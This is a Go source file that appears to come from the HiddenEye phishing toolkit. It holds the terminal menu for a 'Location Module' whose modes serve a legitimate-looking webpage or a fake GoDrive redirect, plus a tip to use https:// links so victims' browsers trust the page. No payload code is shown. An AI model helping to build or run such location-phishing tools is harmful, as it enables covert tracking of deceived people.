package controllers

import (
	helpers "HiddenEye/helpers"
	Colors "HiddenEye/utils"
	"bufio"
	"fmt"
	"os"
)

func Get_Location() {
	helpers.Clear_screen()
	fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Location Module is loaded\t")
	fmt.Println(Colors.Red(), "\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Select Mode\t")

	fmt.Println(Colors.Red(), "\n\n--------------------------------------------------------------------------------------------------")

	fmt.Print(Colors.Red(), "\nOperation Mode:")

	fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"1"+Colors.Red()+"]", Colors.White(), " NearYou (Webpage looks like legitimate)",
		Colors.Red(), "\n\n["+Colors.White()+"2"+Colors.Red()+"]", Colors.White(), " GoDrive (Ask for user permission on redirect to GoDrive)",
	)

	fmt.Print(Colors.Red(), "\n\n┌─[ "+Colors.Green()+"HIDDEN-EYE"+Colors.Blue()+"~"+Colors.White()+"@HOME"+Colors.Red()+
		"/"+Colors.Blue()+"LOCATION"+Colors.Red()+" ]"+"\n└──╼"+Colors.White()+"$ ")

	option := helpers.Input_User(1, 2)

	if option == 1 {
		helpers.Clear_screen()
		helpers.Prompt()

		fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Please use Tunnels/URL with", Colors.Red(), " https:// ", Colors.White(), "in front of it")
		fmt.Println(Colors.Red(), "\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Browser trusts only with", Colors.Red(), " https:// ", Colors.White(), " links")
		fmt.Println(Colors.Red(), "\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " If you have setup files correctly ", Colors.Red(), "Press Enter to continue...", Colors.White())

		bufio.NewReader(os.Stdin).ReadBytes('\n')

	}

}
